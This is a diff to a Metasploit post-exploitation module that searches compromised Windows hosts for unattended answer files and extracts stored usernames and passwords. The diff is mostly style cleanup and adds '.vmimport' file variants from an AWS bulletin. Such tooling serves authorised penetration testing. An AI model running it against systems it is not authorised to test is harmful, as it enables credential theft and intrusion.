@@ -9,37 +9,42 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Registry
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Gather Unattended Answer File Enumeration',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Unattended Answer File Enumeration',
+        'Description' => %q{
           This module will check the file system for a copy of unattend.xml and/or
-        autounattend.xml found in Windows Vista, or newer Windows systems.  And then
-        extract sensitive information such as usernames and decoded passwords.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
+          autounattend.xml found in Windows Vista, or newer Windows systems.  And then
+          extract sensitive information such as usernames and decoded passwords.  Also
+          checks for '.vmimport' files that could have been created by the AWS EC2 VMIE service.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Sean Verity <veritysr1980[at]gmail.com>',
           'sinn3r',
-          'Ben Campbell'
+          'Ben Campbell',
+          'GhostlyBox'
         ],
-      'References'    =>
-        [
+        'References' => [
           ['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],
           ['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
-          ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580']
+          ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580'],
+          ['URL', 'https://aws.amazon.com/security/security-bulletins/AWS-2024-006/'],
+          ['URL', 'https://www.immersivelabs.com/blog/the-return-of-unattend-xml-revenge-of-the-cleartext-credentials/']
         ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter','shell' ]
-    ))
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ]
+      )
+    )
 
     register_options(
       [
         OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])
-      ])
+      ]
+    )
   end
-
 
   #
   # Determine if unattend.xml exists or not
@@ -47,7 +52,6 @@ class MetasploitModule < Msf::Post
   def unattend_exists?(xml_path)
     exist?(xml_path)
   end
-
 
   #
   # Read and parse the XML file
@@ -59,7 +63,7 @@ class MetasploitModule < Msf::Post
     begin
       xml = REXML::Document.new(raw)
     rescue REXML::ParseException => e
-      print_error("Invalid XML format")
+      print_error('Invalid XML format')
       vprint_line(e.message)
       return nil, raw
     end
@@ -72,32 +76,30 @@ class MetasploitModule < Msf::Post
   #
   def save_cred_tables(cred_table)
     t = cred_table
-    vprint_line("\n#{t.to_s}\n")
+    vprint_line("\n#{t}\n")
     p = store_loot('windows.unattended.creds', 'text/plain', session, t.to_csv, t.header, t.header)
     print_good("#{t.header} saved as: #{p}")
   end
-
 
   #
   # Save the raw version of unattend.xml
   #
   def save_raw(xmlpath, data)
     return if data.empty?
+
     fname = ::File.basename(xmlpath)
     p = store_loot('windows.unattended.raw', 'text/plain', session, data)
     print_good("Raw version of #{fname} saved as: #{p}")
   end
-
 
   #
   # If we spot a path for the answer file, we should check it out too
   #
   def get_registry_unattend_path
     # HKLM\System\Setup!UnattendFile
-    fname = registry_getvaldata("HKEY_LOCAL_MACHINE\\System\\Setup", "UnattendFile")&.strip
+    fname = registry_getvaldata('HKEY_LOCAL_MACHINE\\System\\Setup', 'UnattendFile')&.strip
     return fname
   end
-
 
   #
   # Initialize all 7 possible paths for the answer file
@@ -108,7 +110,9 @@ class MetasploitModule < Msf::Post
     files =
       [
         'unattend.xml',
-        'autounattend.xml'
+        'autounattend.xml',
+        'unattend.xml.vmimport',
+        'autounattend.xml.vmimport'
       ]
 
     target_paths =
@@ -132,7 +136,6 @@ class MetasploitModule < Msf::Post
     paths << reg_path unless reg_path.blank?
     return paths
   end
-
 
   def run
     init_paths.each do |xml_path|
